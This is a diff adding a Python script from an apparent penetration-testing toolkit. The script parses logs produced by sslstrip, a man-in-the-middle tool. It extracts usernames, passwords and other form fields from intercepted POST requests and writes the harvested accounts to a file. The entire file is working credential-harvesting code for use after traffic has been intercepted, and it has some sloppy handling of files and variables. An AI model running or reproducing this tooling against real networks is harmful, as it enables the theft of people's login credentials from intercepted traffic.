@@ -1,0 +1,135 @@
+#!/usr/bin/env python
+
+#####################
+# ParseLog.py
+#
+# By z3ros3c@gmail.com
+#####################
+
+""" Parselog.py
+	By z3ros3c@gmail.com
+	
+	penbang version
+	
+	This file parses the sslstrip.log created by
+    sslstrip for usernames and passwords (and other
+    interesting information) defined in the file
+    def.txt. It will also
+    give you a complete list of all unknown information,
+    with the exception of anything listed in the file
+    blacklist.txt
+    
+    Usage:
+		parselog input output
+	
+	output	[default path is penbang/netkit/SMITM/parse/]
+"""
+
+from urllib import unquote
+import sys
+import os
+
+getIP = lambda origin: origin[origin.find('(')+1:origin.find(')')]
+
+blacklist = []
+accounts = []
+definitions = {}
+
+def getDefs(defs):
+  d = {}
+  for definition in defs:
+    tmp = definition.split('|')
+    a = tmp.pop(0)
+    b = tmp.pop()
+    if('\n' in b):
+      b = b[:-1]
+    tmp.append(b)
+    d[a] = tmp[:]
+  return d
+
+def getAllVars(line):
+  while('&&' in line):
+    line = line.replace('&&','&')
+  vars = {}
+  tmp = line.split('&')
+  for var in tmp:
+    try:
+      (a,b) = var.split('=')
+      if('$' in unquote(a)):
+        a = unquote(a).split('$').pop()
+      if('\n' in unquote(b)):
+        b = unquote(b)[:-1]
+      vars[unquote(a)] = unquote(b)
+    except:
+      pass
+  return vars
+
+def process(origin,line):
+  origin = getIP(origin)
+  if(origin not in blacklist):
+    vars = getAllVars(line)
+    if(origin in definitions):
+      definition = definitions[origin][:]
+      name = definition.pop(0)
+      account = "(%s) " % name
+      for variable in definition:
+        try:
+          v = vars[variable]
+        except:
+          v = 'UNDEFINED'
+        account += "%s = %s :: " % (variable,v)
+      if('UNDEFINED' not in account):
+        if(account not in accounts):
+          accounts.append(account)
+          account += "**NEW**"
+        print(account)
+    else:
+      print("Unknown:\t%s" % origin)
+      for var in vars:
+        if(vars[var] != ""):
+          print("\t%s:\t%s" % (var,vars[var]))
+
+#./parselog path/to/file
+for p in sys.argv[1:]:
+	try:
+		lines = open(p,'r').readlines()
+	except:
+		lines = []
+
+try:
+  blacklist = open('penbang/netkit/SMITM/blacklist.txt','r').read().split('\n')
+except:
+  print("--blacklist not defined--")
+try:
+  accounts = open('accounts.txt','r').read().split('\n')
+except:
+  pass
+try:
+  definitions = getDefs(open('penbang/netkit/SMITM/def.txt','r').readlines())
+except:
+  pass
+
+try:
+  line = lines.pop(0)
+  while(1):
+    while('POST' not in line):
+      try:
+        line = lines.pop(0)
+      except:
+        break
+    process(line,lines.pop(0))
+    try:
+      line = lines.pop(0)
+    except:
+      break
+except:
+  print("Empty logfile.")
+
+for p in sys.argv[2:]:
+	output = open('penbang/netkit/SMITM/parse/'+p+'.accounts','w')
+accounts.sort()
+for account in accounts:
+  if(account != ''):
+    output.write(account + '\n')
+
+	
